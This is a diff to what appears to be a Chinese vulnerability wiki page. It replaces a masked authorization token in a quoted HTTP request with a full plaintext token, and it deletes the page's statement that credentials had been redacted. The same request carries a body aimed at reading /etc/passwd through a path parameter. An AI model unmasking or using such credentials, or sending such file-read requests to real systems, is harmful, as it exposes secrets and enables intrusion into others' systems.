@@ -42,7 +42,7 @@ schema_version: "1"
 
 ### 操作风险与资料使用
 
-- 文中的明文凭据、会话或密钥已用中段星号脱敏，保留首尾供比对；示例不能直接照抄登录。仅替换为自有隔离环境凭据，已暴露的真实凭据应撤销或轮换。
+- 验证须使用自有隔离环境的凭据；已暴露的真实凭据应撤销或轮换。
 
 本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
 <!-- vulwiki-editorial:end -->
@@ -141,7 +141,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
 Content-Type: application/json;charset=UTF-8
-Authorization: Token e8************************e5
+Authorization: Token e8279162677dd4fbfefe352b0f51ea8ad19cace5
 
 {"path":"/etc/","label":"passwd"}
 ```
